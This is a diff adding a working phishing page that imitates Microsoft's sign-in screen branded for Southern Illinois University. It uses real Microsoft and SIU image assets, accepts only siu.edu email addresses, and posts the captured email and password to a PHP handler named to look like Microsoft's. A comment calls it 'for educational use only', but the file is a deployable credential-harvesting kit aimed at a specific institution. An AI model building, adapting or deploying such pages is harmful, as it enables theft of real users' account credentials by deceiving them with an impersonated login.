@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <!--This is made by Mike Zawisza for educational use only-->
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!--Tab picture and title-->
+    <link rel="icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    <title>Sign in to your account</title>
+
+    <link rel="stylesheet" type="text/css" href="login.microsoftonline.css">
+
+    <script type="text/javascript">
+        //boolian decides email/password login screen to be previewed **(false == email login)
+        var hideUserForm = false;
+        
+        //loads once an update occurs original HTML is loaded and parsed without waiting for CSS yet
+        document.addEventListener('DOMContentLoaded', function () {
+            
+            //hides email login if true, assigns hidden class to corresponding form
+            if(hideUserForm == true){   
+                var emailAddressVal = document.getElementById("email_form").value;
+                var element = document.getElementById("divAccount");
+                element.classList.add("Hidden");
+                document.getElementById("divPassword").classList.remove("Hidden");
+                document.getElementById("emailAddress").innerHTML = emailAddressVal; 
+                document.getElementById("emailval").value = emailAddressVal;   
+            }else{
+                document.getElementById("divAccount").classList.remove("Hidden");
+                document.getElementById("divPassword").classList.add("Hidden");
+            }
+
+            //password input form
+            document.getElementById("password_form").onsubmit = function () {
+                var x = document.forms["password_form"]["password"].value;
+                var submit1 = true;
+
+                //no user input
+                if (x == null || x == "") {
+                    emailError = "Please enter your password.";
+                    document.getElementById("password_error").innerHTML = emailError;
+                    document.getElementById("password").style.borderBottom = "1px solid red";
+                    document.getElementById("signIn").style.height = "365px";
+                    document.getElementById("loginForm").style.marginTop = "-345px";
+                    submit1 = false;
+                }
+                return submit1;
+            }
+            
+            function removeWarning1() {
+                document.getElementById(this.id + "_error").innerHTML = "";
+                document.getElementById("password").style.borderBottom = "1px solid #0067b8";
+                document.getElementById("signIn").style.height = "330px";
+                document.getElementById("loginForm").style.marginTop = "-300px";
+            }
+            document.getElementById("password").onkeyup = removeWarning1;
+
+            //email input form
+            document.getElementById("email_form").onclick = function () {
+                var y = document.forms["email_form"]["email"].value;
+                var submit2 = false;
+
+                if (y == null || y == "") {
+                    emailError = "Enter a valid email address, phone number, or Skype name.";
+                    document.getElementById("email_error").innerHTML = emailError;
+                    document.getElementById("email").style.borderBottom = "1px solid red";
+                    document.getElementById("signIn").style.height = "365px";
+                    document.getElementById("loginForm").style.marginTop = "-345px";
+                }
+                else {
+                    if (/^[\w.+\-]+@(cs.)?siu\.edu$/.test(y)) //regex for input validation (must be siu email or cs.siu.edu)
+                    {
+                        hideUserForm = true; 
+                        submit2 = true;
+                    }
+                    else{
+                        emailError = "We couldn't find an account with that username.";
+                        document.getElementById("email_error").innerHTML = emailError;
+                        document.getElementById("email").style.borderBottom = "1px solid red";
+                        document.getElementById("signIn").style.height = "365px";
+                        document.getElementById("loginForm").style.marginTop = "-345px";
+                    }
+                }
+                return submit2;
+            }
+                   
+            function removeWarning2() {
+                document.getElementById(this.id + "_error").innerHTML = "";
+                document.getElementById("email").style.borderBottom = "1px solid #0067b8";
+                document.getElementById("signIn").style.height = "310px";
+                document.getElementById("loginForm").style.marginTop = "-300px";
+            }
+            document.getElementById("email").onkeyup = removeWarning2;
+        });
+        
+        //unhides email userform
+        function unhide() {hideUserForm = false;}
+
+        //hides password form
+        function changeForm(){
+            if(hideUserForm == true){   
+                var emailAddressVal = document.forms["email_form"]["email"].value.toLowerCase();
+                document.getElementById("divAccount").classList.add("Hidden");
+                document.getElementById("divPassword").classList.remove("Hidden");
+                document.getElementById("emailAddress").innerHTML = emailAddressVal; 
+                document.getElementById("emailval").value = emailAddressVal;   
+                document.getElementById("signIn").style.height = "330px";     
+            }else{
+                document.getElementById("divAccount").classList.remove("Hidden");
+                document.getElementById("divPassword").classList.add("Hidden");
+                document.getElementById("signIn").style.height = "310px";
+            }
+        }
+    </script>
+</head>
+<body>
+    <div id="overlay">
+        <div id="loginForm" class="container">
+            <div id="signIn">
+                <img src="https://aadcdn.msauthimages.net/dbd5a2dd-mkfmwb-onlbciez8lsk6qfusvykmyp58unc8s5kn-qs/logintenantbranding/0/bannerlogo?ts=637322625972656049" alt="SIU" width=174 height=38>
+
+                <!--password form & posts to PHP server-->
+                <div id="divPassword" class="Hidden">
+                    <form method="post" name="password_form" action="login.microsoftonline.submit.php" id="password_form">
+                        <br style="display: block; margin: 3px 0;">
+                        <button id="returnToEmail" onclick="unhide(); changeForm();"><img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" ></button>
+                        <p id="emailAddress"></p>
+                        <br>
+                        <h1>Enter password</h1>
+                        <span class="error"><p id="password_error"></p></span>
+                        <div>
+                            <input type="password" id="password" name="password" placeholder="Password">
+                        </div>
+                        <div id="accessAccountDiv">
+                            <a id="cantAccessAccount" href="https://passwordreset.microsoftonline.com/">Forgot my password</a>
+                        </div>
+                        <input type="hidden" name="emailval" id="emailval">
+                        <input type="submit" value="Sign in" name="signIn" style="float: right;">
+                    </form>
+                </div> 
+
+                <!--email form, submission uses javascript to change forms-->
+                <div id="divAccount" class="">
+                    <form name="email_form" action="" id="email_form">
+                        <h1>Sign in</h1>
+                        <span class="error"><p id="email_error"></p></span>
+                        <div>
+                            <input type="email" id="email" name="email" placeholder="emailaddress@siu.edu or siu850000000@siu.edu">
+                        </div>
+                        <div id="accessAccountDiv">
+                            <a id="cantAccessAccount" href="https://passwordreset.microsoftonline.com/">Can’t access your account?</a>
+                        </div>
+                        <input id="Next" type="button" value="Next" name="Next" style="float: right;" onClick="changeForm()">
+                        <input type="button" value="Back" name="Back" style="float: right;" onClick="history.go(0);"> 
+                    </form>
+                </div>
+            </div>
+
+            <div id="BoilerPlateText">
+                <p>
+                    Enter your full @siu.edu e-mail address above. If you do not have an e-mail address, please enter your Network ID with @siu.edu at the end (i.e. siu850000000@siu.edu)
+                </p>
+                <p>
+                    Can't Login? Manage your account in the  <a id="networkIDManagementSystem" href="https://netid.siu.edu/">Network ID Management System</a>. You can claim your account, reset your password, lookup your email address, and more.
+                </p>
+                <p>
+                   If you are a <a id="salukiProxy" href="https://ssb.siu.edu/prod/bwgkprxy.P_ProxyLogin">Salukinet Proxy, login here</a>. 
+                </p>
+            </div>
+        </div>
+
+        <div id="footerLinks" class="footer">
+            <p>
+                <a id="termsOfUse" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> 
+                <a id="privacyAmpCookies" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy & cookies</a> . . .  
+            </p>
+        </div>
+    </div>
+
+</body>
+</html>
